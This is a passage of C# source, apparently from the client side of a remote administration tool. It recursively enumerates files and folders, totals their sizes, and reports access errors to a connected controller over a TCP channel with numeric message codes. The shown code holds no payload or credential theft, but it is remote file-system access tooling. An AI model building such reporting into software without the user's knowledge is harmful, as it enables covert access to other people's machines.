            #region File Manager Environment

            List<Array> list_AllFiles = new List<Array>();

            long long_TotalFilesSize = 0, long_TotalSubFolders = 0, long_TotalFiles;

            void CollectFilesLength(string string_NecessaryPath)
            {
                try
                {
                    foreach (string string_CurrentFileName in Directory.GetFiles(string_NecessaryPath))
                    {
                        long_TotalFilesSize += new FileInfo(string_CurrentFileName).Length;
                    }

                    long_TotalFiles += Directory.GetFiles(string_NecessaryPath).Length;
                    long_TotalSubFolders += Directory.GetDirectories(string_NecessaryPath).Length;

                    foreach (string string_NewFolderPath in Directory.GetDirectories(string_NecessaryPath))
                    {
                        CollectFilesLength(string_NewFolderPath);
                    }

                    return;
                }

                catch (System.UnauthorizedAccessException)
                {
                }
            }

            void CollectFiles(string string_NecessaryPath)
            {
                try
                {
                    list_AllFiles.Add(Directory.GetFiles(string_NecessaryPath));

                    foreach (string string_NewFolderPath in Directory.GetDirectories(string_NecessaryPath)) CollectFiles(string_NewFolderPath);

                    return;
                }

                catch (System.UnauthorizedAccessException)
                {
                    MemoryStream memoryStream_DataToSend = new MemoryStream();

                    CommonMethods.WriteIntToStream(memoryStream_DataToSend, 26);
                    CommonMethods.WriteIntToStream(memoryStream_DataToSend, 1); // Error code of IO Error
                    CommonMethods.WriteStringToStream(memoryStream_DataToSend, string_NecessaryPath);

                    CurrentlyUsedTcpClient.SendData(memoryStream_DataToSend.ToArray(), SentDataType.ApplicationData);

                    memoryStream_DataToSend.Close();

                    return;
                }
            }


            FileAttributes ReturnHiddenAttribute(string string_ReceivedAttributes)
            {
                if (string_ReceivedAttributes.IndexOf("Hidden") != -1) return FileAttributes.Hidden;
                else return FileAttributes.Device;
            }

            FileAttributes ReturnReadOnlyAttribute(string string_ReceivedAttributes)
